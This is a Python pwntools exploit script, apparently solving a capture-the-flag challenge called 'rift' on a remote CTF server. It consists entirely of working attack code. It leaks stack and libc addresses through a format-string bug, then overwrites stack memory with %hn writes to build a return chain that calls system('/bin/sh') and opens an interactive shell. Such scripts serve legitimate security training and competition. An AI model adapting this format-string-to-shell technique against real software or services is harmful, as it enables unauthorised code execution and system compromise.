from pwn import *

elf = context.binary = ELF("./rift",checksec=False)
# p = elf.process()
p = remote("tamuctf.com", 443, ssl=True, sni="rift")

context.arch = elf.arch
libc = elf.libc

# gdb.attach(p,'''
#     init-gef
#     # b *vuln+56
#     c
# ''')

def write_data(offset, data):
    payload = f"%{str((stack-offset-1)&0xffff)}x.%27$hn".encode()
    p.sendline(payload)

    payload = f"%{str((data)&0xffff)}x%41$hn".encode()
    p.sendline(payload)
    data = data >> 16

    payload = f"%{str((stack-offset-1 + 2)&0xffff)}x.%27$hn".encode()
    p.sendline(payload)

    payload = f"%{str((data)&0xffff)}x%41$hn".encode()
    p.sendline(payload)
    data = data >> 16

    payload = f"%{str((stack-offset-1 + 4)&0xffff)}x.%27$hn".encode()
    p.sendline(payload)

    payload = f"%{str((data)&0xffff)}x%41$hn".encode()
    p.sendline(payload)

p.sendline(b"%8$p.%9$p.%11$p")
leak = p.recvline().split(b".")
stack = int(leak[0],16)
elf.address = int(leak[1],16) - 0x1214
libc.address = int(leak[2],16) - 0x2409b

ret = libc.address + 0x000000000002235f
pop_rdi = libc.address + 0x0000000000023a5f

one_gadget = libc.address + 0x449d3

log.critical(f"Stack: {hex(stack)}")
log.critical(f"ELF: {hex(elf.address)}")
log.critical(f"LIBC: {hex(libc.address)}")
log.critical(f"One gadget: {hex(one_gadget)}")
log.critical(f"Ret: {hex(ret)}")

write_data(8, pop_rdi)
write_data(0, next(libc.search(b"/bin/sh\x00")))
write_data(-8, libc.sym["system"])

payload = f"%{str((stack-9 + 4 - 0x10)&0xffff)}x.%27$hn".encode()
p.sendline(payload)

payload = f"%41$hhn".encode()
p.sendline(payload)
# payload = fmtstr_payload()

p.interactive()